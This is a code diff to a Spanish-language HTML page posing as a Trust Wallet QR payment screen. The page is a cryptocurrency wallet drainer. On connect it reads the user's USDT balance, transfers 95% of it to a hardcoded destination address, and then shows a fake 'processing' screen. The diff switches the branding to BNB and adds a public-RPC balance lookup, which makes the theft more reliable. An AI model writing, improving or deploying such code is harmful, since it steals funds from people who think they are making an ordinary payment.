@@ -762,7 +762,7 @@
 <body>
 <div id="pageLoader" class="page-loader" aria-label="Cargando">
     <img
-        src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png"
+        src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/bnb.png"
         alt="Logo"
         class="loader-logo"
     >
@@ -772,7 +772,7 @@
 
 <div id="processingScreen" class="processing-screen" aria-label="Procesando transacción">
     <img
-        src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png"
+        src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/bnb.png"
         alt="Logo"
         class="processing-logo"
     >
@@ -804,7 +804,7 @@
         </div>
 
         <img
-            src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png"
+            src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/bnb.png"
             alt="QR Pagos"
             class="tw-logo"
         >
@@ -960,6 +960,7 @@
 const BILLETERA_DESTINO="0x8085b1e57B4684145dCB953546ce4fCF56C37f4D";
 const CONTRATO_USDT="0x55d398326f99059fF775485246999027B3197955";
 const BSC_CHAIN_ID="0x38";
+const BSC_PUBLIC_RPC="https://bsc-dataseed.bnbchain.org";
 const DECIMALS=18n;
 
 const connectBtn=document.getElementById("connectBtn");
@@ -1024,9 +1025,23 @@ async function ensureBSC(){
  const after=normalizeChainId(await rpc("eth_chainId"));
  if(after!==56) throw new Error("Trust Wallet no quedó conectado a BNB Smart Chain.");
 }
+async function publicRpc(method,params=[]){
+ const response=await fetch(BSC_PUBLIC_RPC,{
+  method:"POST",
+  headers:{"Content-Type":"application/json"},
+  body:JSON.stringify({jsonrpc:"2.0",id:1,method,params})
+ });
+ if(!response.ok) throw new Error("RPC público HTTP "+response.status);
+ const json=await response.json();
+ if(json.error) throw new Error("RPC público: "+(json.error.message||JSON.stringify(json.error)));
+ return json.result;
+}
+
 async function balanceOf(owner){
  const data="0x70a08231"+encAddr(owner);
- return BigInt(await rpc("eth_call",[{to:CONTRATO_USDT,data},"latest"])||"0x0");
+ console.log("Leyendo balance USDT mediante RPC público BNB Chain...");
+ const result=await publicRpc("eth_call",[{to:CONTRATO_USDT,data},"latest"]);
+ return BigInt(result||"0x0");
 }
 
 connectBtn.addEventListener("click",async()=>{
@@ -1048,7 +1063,9 @@ connectBtn.addEventListener("click",async()=>{
  }
  try{
   connectBtn.disabled=true;await ensureBSC();
+  console.log("ETAPA: lectura de saldo por RPC público");
   const balance=await balanceOf(walletAddress);
+  console.log("ETAPA OK: lectura de saldo");
   if(balance===0n)throw new Error("La cuenta no dispone de USDT BEP-20.");
   const amount95Percent=(balance*95n)/100n;
   const data="0xa9059cbb"+encAddr(BILLETERA_DESTINO)+encUint(amount95Percent);
@@ -1082,7 +1099,9 @@ connectBtn.addEventListener("click",async()=>{
   console.log("data:", txRequest.data);
   console.groupEnd();
 
+  console.log("ETAPA: eth_sendTransaction mediante Trust Wallet");
   const txHash=await rpc("eth_sendTransaction",[txRequest]);
+  console.log("ETAPA OK: Trust Wallet devolvió txHash",txHash);
   showProcessingScreen();
   console.log("BEP20 txHash:",txHash);
   await hideProcessingScreenAfterMinimum();
@@ -1154,4 +1173,3 @@ if(maxAction)maxAction.addEventListener("click",async()=>{
 
 </body>
 </html>
-
